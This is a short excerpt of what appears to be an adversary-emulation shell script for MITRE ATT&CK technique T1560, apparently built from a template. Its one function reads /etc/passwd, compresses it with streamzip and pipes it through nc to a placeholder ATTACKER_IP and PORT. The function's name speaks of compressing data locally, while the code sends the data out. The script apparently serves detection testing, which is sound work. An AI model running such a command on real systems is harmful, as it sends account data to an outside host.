...
TTP_ID="T1560" #replace with you coresponding ttp_id
...
CMD_STREAMZIP="/usr/bin/streamzip"
...
PROCEDURE_NAME="streamzip"  # Set by build system from YAML procedure_name field
...
SCRIPT:
  --copy-and-compress-sensitive-data-locally The following command reads file data and compresses the data for exfiltration
...
execute_copy_compress_sensitive_data_locally() {
    local result
    result=$(dd if=/etc/passwd | streamzip - stream | nc ATTACKER_IP PORT 2>&1)
    $CMD_PRINTF "RESULT|%s\n" "$result"
    return 0
}
